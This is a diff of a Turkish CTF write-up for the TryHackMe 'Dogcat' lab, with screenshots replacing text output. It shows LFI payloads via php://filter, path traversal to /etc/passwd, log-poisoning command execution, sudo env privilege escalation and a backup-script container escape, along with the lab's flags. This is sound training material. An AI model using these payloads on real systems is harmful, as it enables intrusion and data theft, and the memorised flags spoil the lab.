@@ -1,11 +1,3 @@
-# TryHackMe Dogcat — Writeup
-
-**Zorluk:** Orta
-**Kategori:** Web / LFI / RCE / Docker Escape
-**IP:** 10.114.144.39
-
-## Giriş
-
 Dogcat, adından da anlaşılacağı gibi köpek ve kedi resimleri gösteren basit bir PHP uygulaması ama arkasında oldukça öğretici bir zincir saklıyor. LFI ile başlayıp log poisoning üzerinden RCE'ye, oradan `sudo` yanlış yapılandırmasıyla root'a, en sonunda da bir Docker container'ından host makineye kaçışa kadar giden dört flag'li bir makine. Aşağıda tüm süreci adım adım anlatıyorum.
 
 ## 1. Keşif
@@ -15,17 +7,7 @@ Dogcat, adından da anlaşılacağı gibi köpek ve kedi resimleri gösteren bas
 ```bash
 nmap -sS -A -p- -T4 10.114.144.39
 ```
-
-Sonuç:
-
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.38 ((Debian))
-|_http-title: dogcat
-```
-
-2 port açık: SSH ve HTTP. Sayfa başlığı zaten "dogcat" — makinenin adına uygun.
+<img width="675" height="210" alt="nmap" src="https://github.com/user-attachments/assets/c5fb038c-eea7-48eb-99cd-62d1edc73d15" />
 
 ## 2. Web Uygulamasını İnceleme
 
@@ -35,6 +17,7 @@ PORT   STATE SERVICE VERSION
 http://10.114.144.39/?view=cat
 http://10.114.144.39/?view=dog
 ```
+<img width="683" height="650" alt="site" src="https://github.com/user-attachments/assets/466f1392-3e5b-4146-8902-905649145062" />
 
 `view` parametresinin sonuna `.php` eklemeyi denediğimde şu hatayı aldım:
 
@@ -53,16 +36,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion
 ```bash
 ffuf -u http://10.114.144.39/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.bak,.zip -c
 ```
-
-Çıktıda dikkat çeken sonuçlar:
-
-```
-cat.php                 [Status: 200]
-flag.php                [Status: 200]
-cats                    [Status: 301]
-dogs                    [Status: 301]
-dog.php                 [Status: 200]
-```
+<img width="815" height="158" alt="ffuf" src="https://github.com/user-attachments/assets/9f53511d-a038-439e-b535-3f9fd1bfcf90" />
 
 `flag.php` diye bir dosya olması işaret fişeği gibiydi.
 
@@ -73,6 +47,9 @@ dog.php                 [Status: 200]
 ```
 http://10.114.144.39/?view=php://filter/convert.base64-encode/resource=cat
 ```
+
+<img width="720" height="343" alt="catbase64" src="https://github.com/user-attachments/assets/fab13107-1272-49bb-8635-b08aba7689ab" />
+
 
 Dönen base64:
 
@@ -91,6 +68,9 @@ Yani `cat.php` sadece rastgele bir resim çağıran bir dosyaymış. LFI'nin ça
 ```
 http://10.114.144.39/?view=php://filter/convert.base64-encode/resource=cats/../flag
 ```
+
+<img width="753" height="288" alt="flagtxt" src="https://github.com/user-attachments/assets/6766d8e4-9a29-4afa-a82f-534111e1df1f" />
+
 
 Dönen base64:
 
@@ -111,6 +91,9 @@ Sırada asıl uygulama dosyası `index.php` vardı:
 ```
 http://10.114.144.39/?view=php://filter/convert.base64-encode/resource=dog/../index
 ```
+
+<img width="1387" height="312" alt="indexbase64" src="https://github.com/user-attachments/assets/b332b3ad-bb79-45e2-8e1b-e39966fe9116" />
+
 
 Base64'ü decode edince uygulamanın tam mantığını gördüm:
 
@@ -142,6 +125,9 @@ Bu bilgiyle `/etc/passwd` dosyasını okumayı denedim:
 http://10.114.144.39/?view=dog/../../../../../../../etc/passwd&ext
 ```
 
+<img width="818" height="473" alt="etcpasswd" src="https://github.com/user-attachments/assets/c00b5ff3-f3fa-452f-9a84-0ec775e64e85" />
+
+
 Ve sistem dosyasının tam içeriğini elde ettim:
 
 ```
@@ -169,6 +155,9 @@ Bu isteği gönderdikten sonra Apache access log'una PHP kodum enjekte olmuş ol
 ```
 http://10.114.144.39/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=whoami
 ```
+
+<img width="846" height="806" alt="wwwdata" src="https://github.com/user-attachments/assets/d35f671c-5606-4c2d-9517-a424aac8bf33" />
+
 
 Çıktı olarak `www-data` döndü — komut çalıştırma başarılıydı. Ardından bir listener açtım:
 
@@ -201,6 +190,9 @@ www-data@b8e52fd13cbb:/var/www$ cat flag2_QMW7JvaY2LvK.txt
 THM{LF1_t0_RC3_aec3fb}
 ```
 
+<img width="505" height="113" alt="flag2" src="https://github.com/user-attachments/assets/fcd18974-5f90-4824-9908-40defb10357c" />
+
+
 ## 7. Privilege Escalation — sudo env
 
 Root olmak için önce sudo yetkilerime baktım:
@@ -209,10 +201,8 @@ Root olmak için önce sudo yetkilerime baktım:
 sudo -l
 ```
 
-```
-User www-data may run the following commands on b8e52fd13cbb:
-    (root) NOPASSWD: /usr/bin/env
-```
+<img width="696" height="338" alt="root+flag3" src="https://github.com/user-attachments/assets/fa40eeef-8d29-45aa-99d0-32acfa801c17" />
+
 
 `env` komutunun root yetkisiyle şifresiz çalıştırılabildiğini görünce direkt GTFOBins'e baktım. Orada önerilen teknik basitti:
 
@@ -248,9 +238,8 @@ Makinenin görev açıklamasında Docker'a dair bir ipucu vardı, bu yüzden ort
 ls -la
 ```
 
-```
--rwxr-xr-x   1 root root    0 Aug 22 19:05 .dockerenv
-```
+<img width="477" height="393" alt="dockerenv" src="https://github.com/user-attachments/assets/ffa6db45-f46f-483c-a62c-93f8836b5cae" />
+
 
 `.dockerenv` dosyasının varlığı, aslında root olduğum yerin host makine değil bir Docker container'ı olduğunu doğruladı. Sistemde gezinirken `/opt` altında bir backup dizinine rastladım:
 
@@ -258,10 +247,8 @@ ls -la
 cat backup.sh
 ```
 
-```bash
-#!/bin/bash
-tar cf /root/container/backup/backup.tar /root/container
-```
+<img width="461" height="112" alt="backupsh" src="https://github.com/user-attachments/assets/702f408d-a1bb-4d92-8873-ba853546e2a3" />
+
 
 Bu script'in host tarafında (muhtemelen bir cron job ile) periyodik olarak çalıştırıldığını düşünerek, kendi reverse shell komutumu script'in sonuna eklemeye karar verdim:
 
@@ -301,36 +288,4 @@ cat flag4.txt
 ```
 THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
 ```
-
-## 11. Sonuç ve Öğrenilenler
-
-Dogcat, tek bir güvenlik açığından başlayıp katman katman ilerleyen klasik bir CTF zinciri kurmuş:
-
-- **LFI'nin kapsamı sanılandan geniş olabilir.** `php://filter` wrapper'ı ile kaynak kodunu okuyup uygulamanın filtreleme mantığındaki zayıflığı (sadece string içerme kontrolü, uzantı bypass'ı) tam olarak anlayabildim.
-- **Log poisoning, klasik ve hâlâ etkili bir RCE tekniğidir.** LFI tek başına dosya okumaya izin verse de, kontrol edilebilir bir dosyaya (access log gibi) kod enjekte edip onu include ettirmek kod çalıştırmaya dönüşüyor.
-- **`sudo` yanlış yapılandırmaları hâlâ en yaygın privesc yollarından biri.** `env` gibi masum görünen bir binary'nin NOPASSWD ile çalıştırılabilmesi doğrudan root'a açılan bir kapı oluyor.
-- **Container izolasyonu, izin verilen dosya yazma haklarıyla kolayca delinebilir.** Host tarafından çalıştırılan bir script'e container içinden yazabilmek, container escape için klasik ama hâlâ çok geçerli bir yöntem.
-
-### Kısa Özet
-
-| Adım | Aksiyon |
-|---|---|
-| Recon | Nmap ile SSH ve HTTP portları tespit edildi |
-| Web Enum | ffuf ile `flag.php`, `cat.php`, `dog.php` bulundu |
-| LFI | `php://filter` wrapper'ı ile kaynak kod okundu, filtre mantığı anlaşıldı |
-| Flag 1 | `flag.php` LFI ile okundu |
-| RCE | Apache access log'u User-Agent üzerinden zehirlendi, LFI RCE'ye çevrildi |
-| Flag 2 | `/var/www` altında bulundu |
-| PrivEsc | `sudo env /bin/sh` ile root olundu |
-| Flag 3 | `/root` altında bulundu |
-| Container Escape | `backup.sh` script'ine reverse shell payload'ı eklendi, host'a geçildi |
-| Flag 4 | Host makinede `/root` altında bulundu |
-
-Flag'ler:
-
-- **flag1:** `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`
-- **flag2:** `THM{LF1_t0_RC3_aec3fb}`
-- **flag3:** `THM{D1ff3r3nt_3nv1ronments_874112}`
-- **flag4:** `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`
-
-Okuduğunuz için teşekkürler, bir sonraki writeup'ta görüşmek üzere.
+<img width="647" height="212" alt="flag4" src="https://github.com/user-attachments/assets/44d1f3e4-bc70-4c08-834e-93a54a9618ad" />
